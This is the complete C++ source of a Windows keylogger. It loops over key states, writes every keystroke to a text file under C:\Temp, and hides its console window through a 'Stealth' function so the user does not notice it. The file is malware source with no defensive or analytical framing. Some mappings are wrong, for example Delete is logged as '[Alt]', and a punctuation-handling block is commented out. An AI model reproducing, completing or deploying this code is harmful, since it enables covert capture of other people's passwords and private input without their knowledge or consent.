//
//  Keylog
//
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>    // These we need to
using namespace std;   // include to get our
#include <windows.h>   // Keylogger working.
#include <winuser.h>   

int Save(int key_stroke, char *file);
void Stealth();

int main()
{
	//SetPriorityClass( GetCurrentProcess(), HIGH_PRIORITY_CLASS);

	Stealth();
	char i;

	while (1)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767) Save(i, "C:\\Temp\\Data.txt");
		}
	}
	system("PAUSE");
	return 0;
}
//Hello 

//T
/* *********************************** */

int Save(int key_stroke, char *file)
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	cout << key_stroke << endl;

	if (key_stroke == 8)
		fprintf(OUTPUT_FILE, "%s", "[Backspace]");
	else if (key_stroke == 13)
		fprintf(OUTPUT_FILE, "%s", "[Enter]\n");
	else if (key_stroke == 32)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[Tab]");
	else if (key_stroke == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "");
	else if (key_stroke == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[Ctrl]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[Esc]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[End]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[Home]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[Left]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[Up]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[Right]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[Down]");

	else if (key_stroke == VK_PRIOR)
		fprintf(OUTPUT_FILE, "%s", "[Pg Up]");
	else if (key_stroke == VK_NEXT)
		fprintf(OUTPUT_FILE, "%s", "[Pg Dn]");
	else if (key_stroke == VK_PRINT)
		fprintf(OUTPUT_FILE, "%s", "[Prt Scr]");
	else if (key_stroke == VK_MENU)
		fprintf(OUTPUT_FILE, "%s", "[Alt]");
	else if (key_stroke == VK_DELETE)
		fprintf(OUTPUT_FILE, "%s", "[Alt]");
	else if (key_stroke == VK_CAPITAL)
		fprintf(OUTPUT_FILE, "%s", "");


/*
	else if (key_stroke == VK_OEM_1)
		{
			if (GetAsyncKeyState(VK_SHIFT) == -32768)fprintf(OUTPUT_FILE, "%s", ":");
			else fprintf(OUTPUT_FILE, "%s", ";");
		}
	else if (key_stroke == VK_OEM_2)
	{
		if (GetAsyncKeyState(VK_SHIFT) == -32768)fprintf(OUTPUT_FILE, "%s", "?");
		else fprintf(OUTPUT_FILE, "%s", "/");
	}
	else if (key_stroke == VK_OEM_3)
	{
		if (GetAsyncKeyState(VK_SHIFT) == -32768)fprintf(OUTPUT_FILE, "%s", "~");
		else fprintf(OUTPUT_FILE, "%s", "`");
	}
	else if (key_stroke == VK_OEM_4)
	{
		if (GetAsyncKeyState(VK_SHIFT) == -32768)fprintf(OUTPUT_FILE, "%s", "{");
		else fprintf(OUTPUT_FILE, "%s", "[");
	}
	else if (key_stroke == VK_OEM_5)
	{
		if (GetAsyncKeyState(VK_SHIFT) == -32768)fprintf(OUTPUT_FILE, "%s", "|");
		else fprintf(OUTPUT_FILE, "%s", "\\");
	}
	else if (key_stroke == VK_OEM_6)
	{
		if (GetAsyncKeyState(VK_SHIFT) == -32768)fprintf(OUTPUT_FILE, "%s", "}");
		else fprintf(OUTPUT_FILE, "%s", "]");
	}
	else if (key_stroke == VK_OEM_7)
	{
		if (GetAsyncKeyState(VK_SHIFT) == -32768)fprintf(OUTPUT_FILE, "%s", "\"");
		else fprintf(OUTPUT_FILE, "%s", "\'");
	}
*/






	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");

	else if (key_stroke >= 65 && key_stroke <= 90)
	{
		     if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 && GetAsyncKeyState(VK_SHIFT) != -32768) fprintf(OUTPUT_FILE, "%s", &key_stroke);
		else if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0 && GetAsyncKeyState(VK_SHIFT) == -32768) fprintf(OUTPUT_FILE, "%s", &key_stroke);
		else
		{
			key_stroke = key_stroke + 32;
			fprintf(OUTPUT_FILE, "%s", &key_stroke);
		}
	}
	else
	{
		fprintf(OUTPUT_FILE, "%s", &key_stroke);
	}
	fclose(OUTPUT_FILE);
	return 0;
}

/* *********************************** */

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

